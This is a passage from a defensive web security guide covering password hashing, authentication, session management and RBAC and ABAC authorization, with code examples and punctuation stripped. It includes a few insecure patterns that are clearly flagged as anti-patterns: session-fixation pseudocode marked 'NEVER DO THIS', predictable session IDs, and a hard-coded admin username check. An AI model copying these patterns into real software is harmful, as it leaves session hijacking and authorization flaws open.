salt won t help them use a lookup table to mount an attack on the collection of hashes  A salt should be globally unique per user  OWASP recommends 32 or 64 bit salt if you can manage it  and NIST requires 128 bit at a minimum  A UUID will certainly work and although probably overkill  it s generally easy to generate  if costly to store  Hashing and salting is a good start  but as we will see below  even this might not be enough  Use A Hash That s Worth Its Salt Sadly  all hashing algorithms are not created equal  SHA 1 and MD5 had been common standards for a long time until the discovery of a low cost collision attack  Luckily there are plenty of alternatives that are low collision  and slow  Yes  slow  A slower algorithm means that a brute force attack is more time consuming and therefore costlier to run  The best widely available algorithms are now considered to be scrypt and bcrypt  Because contemporary SHA algorithms and PBKDF2 are less resistant to attacks where GPUs are used  they are probably not great long term strategies  A side note  technically Argon2  scrypt  bcrypt and PBKDF2 are key derivation functions that use key stretching techniques  but for our purposes  we can think of them as a mechanism for creating a hash  Hash Algorithm Use for passwords  scrypt Yes bcrypt Yes SHA 1 No SHA 2 No MD5 No PBKDF2 No Argon2 watch  see sidebar  About Argon2 In July of 2015  Argon2 was announced as the winner of the Password Hashing Competition  Bindings are available for several languages  Argon2 was designed specifically for the purpose of hashing passwords and is resistant to attacks using GPUs and other specialized hardware  However  it is very new and has not yet been broadly adopted  although signs are good that it will be soon  Pay attention to how this adoption occurs  and when implementations become more widely available  When we feel comfortable recommending adoption  we ll update this evolving publication  In addition to choosing an appropriate algorithm  you want to make sure you have it configured correctly  Key derivation functions have configurable iteration counts  also known as work factor  so that as hardware gets faster  you can increase the time it takes to brute force them  OWASP provides recommendations on functions and configuration in their Password Storage Cheat Sheet  If you want to make your application a bit more future proof  you can add the configuration parameters in the password storage  too  along with the hash and salt  That way  if you decide to increase the work factor  you can do so without breaking existing users or having to do a migration in one shot  By including the name of the algorithm in storage  too  you could even support more than one at the same time allowing you to evolve away from algorithms as they are deprecated in favor of stronger ones  Once More with Hashing Really the only change to the code above is that rather than storing the password in clear text  you are storing the salt  the hash  and the work factor  That means when a user first chooses a password  you will want to generate a salt and hash the password with it  Then  during a login attempt  you will use the salt again to generate a hash to compare with the stored hash  As in  CREATE TABLE application_user   email_address VARCHAR 100  NOT NULL PRIMARY KEY  hash_and_salt VARCHAR 60  NOT NULL   def login conn  email  password   result   conn cursor   execute   SELECT hash_and_salt FROM application_user WHERE email_address        email   user   result fetchone   if user is not None  hashed   user 0  encode  utf 8   return is_hash_match password  hashed  return False def is_hash_match password  hash_and_salt   salt   hash_and_salt 0 29  return hash_and_salt    bcrypt hashpw password  salt  The example above uses the python bcrypt library  which stores the salt and the work factor in the hash for you  If you print out the results of hashpw     you can see them embedded in the string  Not all libraries work this way  Some output a raw hash  without salt and work factor  requiring you to store them in addition to the hash  But the result is the same  you use the salt with a work factor  derive the hash  and make sure it matches the one that was originally generated when the password was first created  Final Tips This might be obvious  but all the advice above is only for situations where you are storing passwords for a service that you control  If you are storing passwords on behalf of the user to access another system  your job is considerably more difficult  Your best bet is to just not do it since you have no choice but to store the password itself  rather than a hash  Ideally the third party will be able to support a much more appropriate mechanism like SAML  OAuth or a similar mechanism for this situation  If not  you need to think through very carefully how you store it  where you store it and who has access to it  It s a very complicated threat model  and hard to get right  Many sites create unreasonable limits on how long your password can be  Even if you hash and salt correctly  if your password length limit is too small  or the allowed character set too narrow  you substantially reduce the number of possible passwords and increase the probability that the password can be brute forced  The goal  in the end  is not length  but entropy  but since you can t effectively enforce how your users generate their passwords  the following would leave in pretty good stead  Minimum 12 alpha numeric and symbolic  1   A long maximum like 100 characters  OWASP recommends capping it at most 160 to avoid susceptibility to denial of service attacks resulting from passing in extremely long passwords  You ll have to decide if that s really a concern for your application  Provide your users with some kind of text recommending that  if at all possible  they  use a password manager randomly generate a long password  and don t reuse the password for another site  Don t prevent the user from pasting passwords into the password field  It makes many password managers unusable If your security requirements are very stringent then you may want to think beyond password strategy and look to mechanisms like two factor authentication so you aren t over reliant on passwords for security  Both NIST and Wikipedia have very detailed explanations of the effects of character length and set limits on entropy  If you are resources constrained  you can get quite specific about the cost of breaking into your systems based on speed of GPU clusters and keyspace  but for most of situations  this level of specificity just isn t necessary to find an appropriate password strategy  In Summary Hash and salt all passwords  Use an algorithm that is recognized as secure and sufficiently slow  Ideally  make your password storage mechanism configurable so it can evolve  Avoid storing passwords for external systems and services  Be careful not to set password size limits that are too small  or character set limits that are too narrow  Authenticate Users Safely If we need to know the identity of our users  for example to control who receives specific content  we need to provide some form of authentication  If we want to retain information about a user between requests once they have authenticated  we will also need to support session management  Despite being well known and supported by many full featured frameworks  these two concerns are implemented incorrectly often enough that they have earned spot  2 in the OWASP Top 10  Authentication is sometimes confused with authorization  Authentication confirms that a user is who they claim to be  For example  when you log into your bank  your bank can verify it is in fact you and not an attacker trying to steal the fortune you amassed selling your captioned cat pictures site  Authorization defines whether a user is allowed to do something  Your bank may use authorization to allow you to see your overdraft limit  but not allow you to change it  Session management ties authentication and authorization together  Session management makes it possible to relate requests made by a particular user  Without session management  users would have to authenticate during each request they sent to a web application  All three elements   authentication  authorization  and session management   apply to both human users and to services  Keeping these three separate in our software reduces complexity and therefore risk  There are many methods of performing authentication  Regardless of which method you choose  it is always wise to try to find an existing  mature framework that provides the capabilities you need  Such frameworks have often been scrutinized over a long period of time and avoid many common mistakes  Helpfully  they often come with other useful features as well  An overarching concern to consider from the start is how to ensure credentials remain private when a client sends them across the network  The easiest  and arguably only  way to achieve this is to follow our earlier advice to use HTTPS for everything  One option is to use the simple challenge response mechanism specified in the HTTP protocol for a client to authenticate to a server  When your browser encounters a 401  Unauthorized  response that includes information about a challenge to access the resource  it will popup a window prompting you to enter your name and password  keeping them in memory for subsequent requests  This mechanism has some weaknesses  the most serious of which being that the only way for a user to logout is by closing their browser  A safer option that allows you to manage the lifecycle of a user s session after authenticating is by simply entering credentials through a web form  This can be as simple as looking up a username in a database table and comparing the hash of a password using an approach we outlined in our earlier section on hashing passwords  For example  using Devise  a popular framework for Ruby on Rails  this can be done by registering a module for password authentication in the model used to represent a User  and instructing the framework to authenticate users before requests are processed by controllers    Register Devise s database_authenticatable module in our User model to   handle password authentication using bcrypt  We can optionally tune the work   factor with the  stretches  option  class User   ActiveRecord  Base devise  database_authenticatable end   Superclass to inherit from in controllers that require authentication class AuthenticatedController   ApplicationController before_action  authenticate_user  end Understand Your Options Although authenticating using a username and a password works well for many systems  it isn t our only option  We can rely on external service providers where users may already have accounts to identify them  We can also authenticate users using a variety of different factors  something you know  such as a password or a PIN  something you have  such as your mobile phone or a key fob  and something you are  such as your fingerprints  Depending on your needs  some of these options may be worth considering  while others are helpful when we want to add an extra layer of protection  One option that offers a convenience for many users is to allow them to log in using their existing account on popular services such as Facebook  Google  and Twitter  using a service called Single Sign On  SSO   SSO allows users to log in to different systems using a single identity managed by an identity provider  For example  when visiting a website you may see a button that says  Sign in with Twitter  as an authentication option  To achieve this  SSO relies on the external service to manage logging the user in and to confirm their identity  The user never provides any credentials to our site  SSO can significantly reduce the amount of time it takes to sign up for a site and eliminates the need for users to remember yet another username and password  However  some users may prefer to keep their use of our site private and not connect it to their identity elsewhere  Others may not have an existing account with the external providers we support  It is always preferable to allow users to register by manually entering their information as well  A single factor of authentication such as a username and password is sometimes not enough to keep users safe  Using other factors of authentication can add an additional layer of security to protect users in the event a password is compromised  With Two Factor Authentication  2FA   a second  different factor of authentication is required to confirm the identity of a user  If something the user knows  such as a username and password  is used as the first factor of authentication  a second factor could be something the user has  such as a secret code generated using software on their mobile phone or by a hardware token  Verifying a secret code sent to a user via SMS text message was once a popular way of doing this  but it is now deprecated due to presenting various risks  Applications like Google Authenticator and a multitude of other products and services can be safer and are relatively easy to implement  although any option will increase complexity of an application and should be considered mainly when applications maintain sensitive data  Reauthenticate For Important Actions Authentication isn t only important when logging in  We can also use it to provide additional protection when users perform sensitive actions such as changing their password or transferring money  This can help limit the exposure in the event a user s account is compromised  For example  some online merchants require you to re enter details from your credit card when making a purchase to a newly added shipping address  It is also helpful to require users to re enter their passwords when updating their personal information  Conceal Whether Users Exist When a user makes a mistake entering their username or password  we might see a website respond with a message like this  The user ID is unknown  Revealing whether a user exists can help an attacker enumerate accounts on our system to mount further attacks against them or  depending on the nature of the site  revealing the user has an account may compromise their privacy  A better  more generic  response might be  Incorrect user ID or password  This advice doesn t just apply when logging in  Users can be enumerated through many other functions of a web application  for example when signing up for an account or resetting their password  It is good to be mindful of this risk and avoid disclosing unnecessary information  One alternative is to send an email with a link to continue their registration or a password reset link to a user after they enter their email address  instead of outputting a message indicating whether the account exists  Preventing Brute Force Attacks An attacker might try to conduct a brute force attack to guess account passwords until they find one that works  With attackers increasingly using large networks of compromised systems referred to as botnets to conduct attacks with  finding an effective solution to protect against this while not impacting service continuity is a challenging task  There are many options we can consider  some of which we ll discuss below  As with most security decisions  each provides benefits but also comes with tradeoffs  A good starting point that will slow an attacker down is to lock users out temporarily after a number of failed login attempts  This can help reduce the risk of an account being compromised  but it can also have the unintended effect of allowing an attacker to cause a denial of service condition by abusing it to lock users out  If the lockout requires an administrator to unlock accounts manually  it can cause a serious disruption to service  In addition  account lockout could be used by an attacker to determine whether accounts exist  Still  this will make things difficult for an attacker and will deter many  Using short lockouts of between 10 to 60 seconds can be an effective deterrent without imposing the same availability risks  Another popular option is to use CAPTCHAs  which attempt to deter automated attacks by presenting a challenge that a human can solve but a computer can not  Oftentimes it seems as though they present challenges that can be solved by neither  These can be part of an effective strategy  but they have become decreasingly effective and face criticisms  Advancements have made it possible for computers to solve challenges with greater accuracy  and it has become inexpensive to hire human labor to solve them  They can also present problems for people with vision and hearing impairments  which is an important consideration if we want our site to be accessible  Layering these options has been used as an effective strategy on sites that see frequent brute force attacks  After two login failures occur for an account  a CAPTCHA might be presented to the user  After several more failures  the account might be locked out temporarily  If that sequence of failures repeats again  it might make sense to lock the account once again  this time sending an email to the account owner requiring them to unlock the account using a secret link  Don t Use Default Or Hard Coded Credentials Shipping software with default credentials that are easy to guess presents a major risk for users and applications alike  It may seem like it is providing a convenience for users  but in reality this couldn t be further from the truth  It is common to see this in embedded systems such as routers and IoT devices  which can immediately become easy targets once connected to networks  Better options might be requiring users to enter unique one time passwords and then forcing the user to change it  or preventing the software from being accessed externally until a password is set  Sometimes hard coded credentials are added to applications for development and debugging purposes  This presents risks for the same reasons and might be forgotten about before the software ships  Worse  it may not be possible for the user to change or disable the credentials  We must never hard code credentials in our software  In Frameworks Most web application frameworks include authentication implementations that support a variety of authentication schemes  and there are many other third party frameworks to choose from as well  As we stated earlier  it is preferable to try to find an existing  mature framework that suits your needs  Below are some examples to get you started  Framework Approaches Java Apache Shiro OACC Spring Spring Security Ruby on Rails Devise ASP NET ASP NET Core authentication Built in Authentication Providers Play play silhouette Node js Passport framework In Summary Use existing authentication frameworks whenever possible instead of creating one yourself  Support authentication methods that make sense for your needs  Limit the ability of an attacker to take control of an account  You can take steps to prevent attacks to identify or compromise accounts  Never use default or hard coded credentials  Protect User Sessions As a stateless protocol HTTP offers no built in mechanism for relating user data across requests  Session management is commonly used for this purpose  both for anonymous users and for users who have authenticated  As we mentioned earlier  session management can apply both to human users and to services  Sessions are an attractive target for attackers  If an attacker can break session management to hijack authenticated sessions  they can effectively bypass authentication entirely  To make matters worse  it is fairly common to see session management implemented in a way that makes it easier for sessions to fall into the wrong hands  So what can we do to get it right  As with authentication  it is preferable to use an existing  mature framework to handle session management for you and tune it for your needs rather than trying to implement it yourself from scratch  To give you some idea of why it is important to use an existing framework so you can focus on using it for your needs  we ll discuss some common problems in session management  which fall into two categories  weaknesses in session identifier generation  and weaknesses in the session lifecycle  Generate Safe Session Identifiers Sessions are typically created by setting a session identifier inside a cookie that will be sent by a user s browser in subsequent requests  The security of these identifiers depend on them being unpredictable  unique  and confidential  If an attacker can obtain a session identifier by guessing it or observing it  they can use it to hijack a user s session  The security of identifiers can be easy to undermine by using predictable values  which is fairly common to see in custom implementations  For example  we might see a cookie of the form  Set Cookie  sessionId NzU4NjUtMTQ2Nzg3NTIyNzA1MjkxMg What happens if an attacker logs in several additional times and observes the following sequence for the sessionId cookie  NzU4ODQtMTQ2Nzg3NTIyOTg0NTE4Ng NzU4OTItMTQ2Nzg3NTIzNTQwODEzOQ An attacker might recognize that the sessionId is base64 encoded and decode it to observe its values  75865 1467875227052912 75884 1467875229845186 75892 1467875235408139 It doesn t take much guesswork to realize the token is comprised of two values  what is most likely a sequence number  and the current time in microseconds  An identifier of this type would take little effort for an attacker to guess and hijack sessions  Although this is a basic example  other generation schemes don t always offer much more in the way of protection  Attackers can make use of freely available statistical analysis tools to improve the chances of guessing more complex tokens  Using predictable inputs such as the current time or a user s IP address to derive a token are not enough for this purpose  So how can we generate a session identifier safely  To greatly reduce the chances of an attacker guessing a token  OWASP s Session Management Cheat Sheet recommends using a session identifier that is a minimum of 128 bits  16 bytes  in length generated using a secure pseudorandom number generator  For example  both Java and Ruby have classes named SecureRandom that obtain pseudorandom numbers from sources such as  dev urandom  Instead of using an identifier that will be used to look up information about a user  some session management implementations put information about the user inside of the cookie itself to eliminate the cost of performing a lookup in a data store  Unless done carefully using cryptographic algorithms to ensure the confidentiality  integrity  and authenticity of the data  this can lead to even more problems  The decision to store any information about a user inside of a cookie is a subject of controversy and should not be taken lightly  As a principle  limit the information sent inside the cookie to what is absolutely necessary  Never store personally identifiable information about the user or secret information  even when you re using encryption  If the information includes things like the user s username or their role and privilege levels  you must protect against the risk of an attacker tampering with the data to bypass authorization or hijack another user s account  If you choose to store this type of information inside of cookies  look for an existing framework that mitigates these risks and has withstood scrutiny by experts  Don t Expose Session Identifiers Using HTTPS will help prevent someone from eavesdropping on network traffic to steal session identifiers  but they are sometimes leaked unintentionally in other ways  In a classic example  an airline customer sends a link to search results on the airline s website to a friend  The link contains a parameter with the customer s session identifier  and the friend is suddenly able to book flights as the customer  Needless to say  exposing the session identifier in the URL is risky  It might get unwittingly sent to a third party like in the above example  exposed in the Referer header if the user clicks a link to an external website  or logged in the site s logs  Cookies are a better choice for this purpose since they don t risk exposure in this way  It is also common to see session identifiers sent in custom HTTP headers and even in body arguments of POST requests  No matter what you choose to do  make sure the session identifier should not be exposed in URLs  logs  referrer  or anywhere they could be accessed by an attacker  Protect Your Cookies When cookies are used for sessions  we should take some simple precautions to make sure they are not unintentionally exposed  There are four attributes that are important to understand for this purpose  Domain  Path  HttpOnly  and Secure  Domain restricts the scope of a cookie to a particular domain and its subdomains  and Path further restricts the scope to a path and its subpaths  Both attributes are set to fairly restrictive values by default when not explicitly set  The default for Domain will only permit a cookie to be sent to the originating domain and its subdomains  and the default for Path will restrict a cookie to the path of the resource where the cookie was set and its subpaths  Setting the Domain to a less restrictive value can be risky  Imagine if we were to set the Domain to martinfowler com when visiting payments martinfowler com to pay for a new book subscription service  This would result in the cookie being sent to martinfowler com and any of its subdomains on subsequent requests  Aside from it potentially being unnecessary to send the cookie to all subdomains  if we don t control every subdomain and their security  for example  are they using HTTPS    it might help an attacker to capture cookies  What would happen if our user visited evil martinfowler com  The Path attribute should also be set as restrictive as possible  If the session identifier is only needed when accessing the  secret  path and its subpaths after logging in at  login  it is a good idea to set it to  secret   The other two attributes  Secure and HttpOnly  control how the cookie is used  The Secure flag indicates that the browser should only send the cookie when using HTTPS  The HttpOnly flag instructs the browser that the cookie should not be accessible through JavaScript or other client side scripts  which helps prevent it being stolen by malicious code  Putting it together  our cookie might look like this  Set Cookie  sessionId  top secret value   path  secret   secure  HttpOnly  domain payments martinfowler com The net effect of the above statement would be a cookie with client script access disabled that is only available to requests to the paths below https   payments martinfowler com secret   By restricting the scope of the cookie  the attack surface becomes much smaller  Managing the Session Lifecycle Properly managing the lifecycle of a session will reduce the risk of it becoming compromised  How you manage sessions depends on your needs  As an example  a bank probably has a very different session lifecycle than our site for captioned cat pictures  We may choose to begin a session during the first request a user makes to our site  or we may decide to wait until the user authenticates  Whatever you choose to do  there is a risk when changing the privilege level of a session  What would happen if an attacker is able to set the session identifier for a user to a less privileged session known to the attacker  for example in a cookie or in a hidden form field  If the attacker is able to trick the user into logging in  they are suddenly in control of a more privileged session  This is an attack called session fixation  There are two things we can do to avoid having our users falling into this trap  First  we should always create a new session when a user authenticates or elevates their privilege level  Second  we should only create session identifiers ourselves and ignore identifiers that aren t valid  We would never want to do this     pseudocode  NEVER DO THIS if   isValid sessionId     session   createSession sessionId     The longer a session is active  the greater the chance an attacker might be able to get their hands on it  To reduce that risk and keep our session table clean  we can impose timeouts on sessions that are left inactive for some amount of time  The duration of time depends on your risk tolerance  On our captioned cat pictures site  it might only be necessary to do this after a month or even longer  A bank  on the other hand  might have a strict policy of timing out sessions after 10 minutes of inactivity as a security precaution  Our users might not be using a computer they exclusively have access to  or they might prefer to not leave their session logged in  Always make sure there is a visible and easy way to log out  When a user does log out  we must instruct the browser to destroy their session cookie by indicating that it expired at a date in the past  For example  based the cookie we set earlier  Set Cookie  sessionId  top secret value   path  secret   secure  HttpOnly  domain payments martinfowler com  expires Thu  01 Jan 1970 00 00 00 GMT One final consideration is providing some way for users to terminate their active sessions in the event they accidentally forgot to logout of a system they don t own or even suspect their account has been compromised  One easy way to deal with this is to terminate all sessions for a user when they change their password  It is also helpful to provide the ability for a user to view a list of their active sessions to help them identify when they are at risk  Verify It There are a lot of different considerations involved in authentication and session management  To make sure we haven t made any mistakes  it is helpful to look at OWASP s ASVS  Application Security Verification Standard   which is an invaluable resource when making sure there are no gaps in requirements or in our implementation  The standard has an entire section on authentication and another on session management  ASVS suggests security based on three levels of needs  1  which will help defend against some basic vulnerabilities  2  which is suitable for an ordinary site that maintains some sensitive data  and 3  which we might see in highly sensitive applications such as for health care or financial services  Most of the security precautions we describe will fit in with level 2  In Frameworks We have outlined only some of the risks that arise in session identifier generation and session lifecycle management  Fortunately  session management is built into most web application frameworks and even some server implementations  providing a number of mature options to use rather than risk implementing it yourself  Framework Approaches Java Tomcat Jetty Apache Shiro OACC Spring Spring Security Ruby on Rails Ruby on Rails Devise ASP NET ASP NET Core authentication Built in Authentication Providers Play play silhouette Node js Passport framework In Summary Use existing session management frameworks instead of creating your own  Keep session identifiers secret  do not use them in URLs or logs  Protect session cookies using attributes to restrict their scope  Create a new session when one doesn t exist or whenever a user changes their privilege level  Never create sessions with ids you haven t created yourself  Make sure users have a way to log out and to terminate their existing sessions  Authorize Actions We discussed how authentication establishes the identity of a user or system  sometimes referred to as a principal or actor   Until that identity is used to assess whether an operation should be permitted or denied  it doesn t provide much value  This process of enforcing what is and is not permitted is authorization  Authorization is generally expressed as permission to take a particular action against a particular resource  where a resource is a page  a file on the files system  a REST resource  or even the entire system  Authorize on the Server Among the most critical mistakes a programmer can make is hiding capabilities rather than explicitly enforcing authorization on the server  For example  it is not sufficient to simply hide the  delete user  button from users that are not administrators  The request coming from the user cannot be trusted  so the server code must perform the authorization of the delete  Further  the client should never pass authorization information to the server  Rather the client should only be allowed to pass temporary identity information  such as session ids  that have been previously generated on the server  and are unguessable  see above for session management practices   Again  the server should not trust anything from the client as far as identity  permissions  or roles  that it cannot explicitly validate  Deny by Default Earlier in this article we talked about the value of positive validation  or whitelisting   The same principle applies with authorization  Your authorization mechanism should always deny actions by default unless they are explicitly allowed  Similarly  if you have some actions that require authorization and others that do not  it is much safer to deny by default and override any actions that don t require a permission  In both cases  providing a safe default limits the damage that can occur if you neglect to specify the permissions for a particular action  Authorize Actions on Resources Generally speaking  you will encounter two different kinds of authorization requirements  global permissions and resource level permissions  You can think of global permission as having an implicit system resource  However  implementation details between a global and resource permissions tend to be different  as demonstrated in the following examples  Because the resource of global permission is implicit  or  if you prefer  non existent  the implementation tends to be straightforward  For example  if I wanted to add a permission check to shutdown my server  I could do the following  public OperationResult shutdown final User callingUser    if  callingUser    null    callingUser hasPermission Permission SHUTDOWN     doShutdown    return SUCCESS    else   return PERMISSION_DENIED      An alternative implementation using Spring Security s declarative capability might look like this   PreAuthorize  hasRole  ROLE_SHUTDOWN     public void shutdown   throws AccessDeniedException   doShutdown      Resource authorization is generally more complex because it validates whether an actor can take a particular action against a particular resource  For example a user should be able to modify their own profile and only their own profile  Again  our system MUST validate that the caller is entitled to take the action on the specific resource being affected  The rules that govern resource authorization are domain specific and can be fairly complicated both to implement and maintain  Existing frameworks may provide assistance  but you will need to make sure the one you use is sufficiently expressive to capture the complexity you require without being too complicated to maintain  An example might look like this  public OperationResult updateProfile final UserId profileToUpdateId  final ProfileData newProfileData  final User callingUser    if  isCallerProfileOwner profileToUpdateId  callingUser     doUpdateProfile profileToUpdateId  newProfileData   return SUCCESS    else   return PERMISSION_DENIED      private boolean isCallerProfileOwner final UserId profileToUpdateId  final User callingUser      Make sure the user is trying to update their own profile return profileToUpdateId equals callingUser getUserId       Or declaratively  using Spring Security again   PreAuthorize  hasPermission  updateUserId   owns     public void updateProfile final UserId updateUserId  final ProfileData profileData  final User callingUser  throws AccessDeniedException   doUpdateProfile updateUserId  profileData     Use Policy to Authorize Behavior Fundamentally  the entire process from identification through execution of an action could be summarized as follows  An anonymous actor becomes a known principal through authentication  Policy determines whether an action can be taken by that principal against a resource    determines whether an can be taken by that principal against a   Assuming the policy allows the action  the action is executed  A policy contains the logic that answers the question of whether an action is or is not allowed  but the way it makes that assessments varies broadly based on the needs of the application  Although we are unable to cover them all  the following section will summarize some of the more common approaches to authorization and provide some idea of when each is best applied  Implementing RBAC Probably the most common variant of authorization is role based access control  RBAC   As the name implies  users are assigned roles and roles are assigned permissions  Users inherit the permission for any roles they have been assigned  Actions are validated for permissions  Perhaps you re wondering about the value of all this indirection  all you care about is that Kristen  your administrator  is able to delete users  and other users cannot  Why not just check for Kristen s username  as in the following code  public OperationResult deleteUser final UserId userId  final User callingUser    if  callingUser    null    callingUser getUsername   equals  admin_kristen      doDelete userId   return SUCCESS    else   return PERMISSION_DENIED      What happens when user  admin_kristen  leaves your organization or changes to another role  You either have to share her credentials  which is  of course  a very bad idea  or go through the code changing all references to  admin_kristen  to the new user  A very common alternative to this is to check for the role  as in this case  public OperationResult deleteUser final UserId userId  final User callingUser    if  callingUser    null    callingUser hasRole Role ADMIN     doDelete userId   return SUCCESS    else   return PERMISSION_DENIED      Better  but not great  We haven t tied identity to the action  but we still have a problem if we find that there are admins with lesser privileges that are allowed to add users  but not delete users  Suddenly our  admin  role isn t granular enough and we re forced to find all the  admin  checks  and  if appropriate  put an OR operation for operations allowed by both admins and our new user_creator role  As the system evolves  you end up with more and more complicated statements and an explosion in the number of roles  Users and roles will change as our software evolves  and so our solution should reflect that  Instead of hard coding user names or even role names  we ll be best served in the long term if our code validates that a particular action is allowed  This code shouldn t be concerned with who the user is  or even what roles they may or may not have  but rather whether they have the permission to do something  The mapping of identity to permission can be done upstream  public OperationResult deleteUser final UserId userId  final User callingUser    if  callingUser    null    callingUser hasPermission Permission DELETE_USER     doDelete userId   return SUCCESS    else   return PERMISSION_DENIED      Our structure is much better now because we ve made the choice to explicitly decouple permissions from roles  Yes  there is some complexity that comes with the extra step needed to map users to permissions  but generally speaking you can take advantage of frameworks like Spring Security or CanCanCan to do the heavy lifting  Consider RBAC when  Permissions are relatively static  Roles in your policies actually map reasonably to roles within your domain  rather than feeling like contrived aggregations of permissions  There isn t a terribly large number of permutations of permission  and therefore roles that will have to be maintained  You have no compelling reason to use one of the other options  Implementing ABAC If your application has more advanced needs than you can reasonably implement with RBAC  you may want to look at attribute based access control  ABAC   Attribute based access control can be thought of as a generalization of RBAC that extends to any attribute of the user  the environment in which the user exists  or the resource being accessed  With ABAC  instead of making access control decisions based on just whether the user has a role assigned  the logic can come from any property of the user s profile such as their position as defined by HR  the amount of time they have worked at the company  or the the country of their IP address  In addition  ABAC can draw on global attributes like the time of day or whether it s a national holiday in the user s locale  The most common standarized means of expressing ABAC policy is XACML  an XML based format from Oasis  This example demonstrates how one might write a rule that allows users to read if they are in a particular department at a particular time of day   Policy PolicyId  ExamplePolicy  RuleCombiningAlgId  urn oasis names tc xacml 1 0 rule combining algorithm permit overrides    Target   Subjects   AnySubject     Subjects   Resources   Resource   ResourceMatch MatchId  urn oasis names tc xacml 1 0 function anyURI equal    AttributeValue DataType  http   www w3 org 2001 XMLSchema anyURI  http   example com resources 1  AttributeValue   ResourceAttributeDesignator DataType  http   www w3 org 2001 XMLSchema anyURI  AttributeId  urn oasis names tc xacml 1 0 resource resource id       ResourceMatch    Resource    Resources   Actions   AnyAction      Actions    Target   Rule RuleId  ReadRule  Effect  Permit    Target   Subjects   AnySubject     Subjects   Resources   AnyResource     Resources   Actions   Action   ActionMatch MatchId  urn oasis names tc xacml 1 0 function string equal    AttributeValue DataType  http   www w3 org 2001 XMLSchema string  read  AttributeValue   ActionAttributeDesignator DataType  http   www w3 org 2001 XMLSchema string  AttributeId  urn oasis names tc xacml 1 0 action action id      ActionMatch    Action    Actions    Target   Condition FunctionId  urn oasis names tc xacml 1 0 function and    Apply FunctionId  urn oasis names tc xacml 1 0 function string equal    Apply FunctionId  urn oasis names tc xacml 1 0 function string one and only    SubjectAttributeDesignator DataType  http   www w3 org 2001 XMLSchema string  AttributeId  department      Apply   AttributeValue DataType  http   www w3 org 2001 XMLSchema string  development  AttributeValue    Apply   Apply FunctionId  urn oasis names tc xacml 1 0 function and    Apply FunctionId  urn oasis names tc xacml 1 0 function time greater than or equal    Apply FunctionId  urn oasis names tc xacml 1 0 function time one and only    EnvironmentAttributeSelector DataType  http   www w3 org 2001 XMLSchema time  AttributeId  urn oasis names tc xacml 1 0 environment current time      Apply   AttributeValue DataType  http   www w3 org 2001 XMLSchema time  09 00 00  AttributeValue    Apply   Apply FunctionId  urn oasis names tc xacml 1 0 function time less than or equal    Apply FunctionId  urn oasis names tc xacml 1 0 function time one and only    EnvironmentAttributeSelector DataType  http   www w3 org 2001 XMLSchema time  AttributeId  urn oasis names tc xacml 1 0 environment current time       Apply   AttributeValue DataType  http   www w3 org 2001 XMLSchema time  17 00 00  AttributeValue    Apply    Apply    Condition    Rule   Rule RuleId  Deny  Effect  Deny      Policy  It s worth mentioning that XACML has its challenges  It is certainly verbose and arguably cryptic  It s also one of the few options you have if you want to use a standardized model for defining ABAC policies  Another option is to build policies in the language of your application  bound to its domain  Below is an example of the same policy written in JavaScript declarative style supported by a small DSL  allow  read    of anyResource     if and  User department   is equalTo  development     timeOfDay   isDuring  9 00 PST    17 00 PST       There s considerable work to do here in addition to the defining of the policy itself that is beyond the scope of this article  To get a flavor for how something like this might be implemented  you can take a look at the repository for the DSL implementation that supports the example policy  Should you choose the path of using custom code  you will need to think about how much investment you are willing to make in the DSL itself and who owns the implementation  If you expect to have a large number of highly dynamic policies  a more sophisticated DSL might be worthwhile  An external DSL might be justified for cases in which non programmers need to understand the policies  Otherwise  for cases of more limited scope and static policies  it s best to start simple with the goal of making the policies clear to their primary maintainers  the programmers  and letting the DSL evolve over the lifecycle of the project  always taking care that changes to the DSL do not break existing policy implementations  Creating in a DSL is not a must  You can use the same object oriented  functional  or procedural coding style the rest of your application uses  and rely on strong design and refactoring practices to create clean code  The repo also includes an example with the same rules using a imperative  rather than declarative  approach  Consider ABAC when  Permissions are highly dynamic and simply changing user roles is going to be a significant maintenance headache  The profile attributes on which permissions depend are already maintained for other purposes  such as managing an employee s HR profile  Access control is sufficiently sensitive that control flows need to vary based on temporal attributes such as whether it s during the normal working hours of your employees  You wish to have centralized policy with very fine grained permissions  managed independently of your application code  Other Ways to Model Policy The above are just two possible ways of modeling policy and will probably accommodate most situations  Although they are probably rare  situations do arise that don t fit well into RBAC or ABAC  Other approaches include  Mandatory access control  MAC   centrally managed non overridable policy based on subject and resource security attributes  such as Linux  LSM  Relationship based Access Control  ReBAC   policy that is largely determined by relationship between principals and resources  Discretionary Access Control  DAC   policy approach that includes owner managed permission control  as well as systems with transferable tokens of authority  Rule based Access Control  dynamic role or permission assignment based on a set of operator programmed rules There is not universal agreement on when these approaches apply or even exactly how to define them  There is substantial overlap in the types of policies they allow operators to define  Before going down the path of choose a more esoteric approach  or inventing your own  be sure that RBAC or ABAC aren t reasonable approaches to modeling your policies  Implementation Considerations Finally  here are a few words of advice to consider when implementing authorization in your application  Browser caches can really mess with your authorization model when users share browsers  Make sure that you set the Cache Control header to  private  no cache  no store  for resources so that your server side authorization code is called every time   You will inevitably have to make a decision whether to use a declarative or imperative approach to validation logic  There is no right or wrong here  but you will want to consider what provides the most clarity  Declarative mechanisms like the annotations that Spring Security provides can be concise and elegant  but if the authorization flow is complicated  the built in expression language becomes convoluted and  arguably  you re better off writing well factored code   Try to find a solution  whether custom or framework based  that consolidates and reduces duplication of authorization logic  If you find your authorization code is scattered arbitrarily throughout your codebase  you are going to have a very hard time maintaining it  and that leads to security bugs  In Summary Authorization must always be checked on the server  Hiding user interface components is fine for user experience  but not an adequate security measure  Deny by default  Positive validation is safer and less error prone than negative validation  Code should authorize against specific resources such as files  profiles  or REST endpoints  Authorization is domain specific  but there are some common patterns to consider when designing your permission model  Stick to common patterns and frameworks unless you have a very compelling reason not to  Use RBAC for basic cases and keep permissions and roles decoupled to allow your policies to evolve  For more complicated scenarios  consider ABAC  and use XACML or policies coded in the application s language  This article is an Evolving Publication  Our intention is to continue to describe basic techniques that developers could  and should  use to reduce the chances of a security breach  To find out when we expand the article  follow the site s RSS feed or Martin s twitter feed  We ll also announce updates on our twitter feeds  Cade Cairns and Daniel Somerfield,"[400 629 28 45 444 1395 1001 329 454 1267 248]"
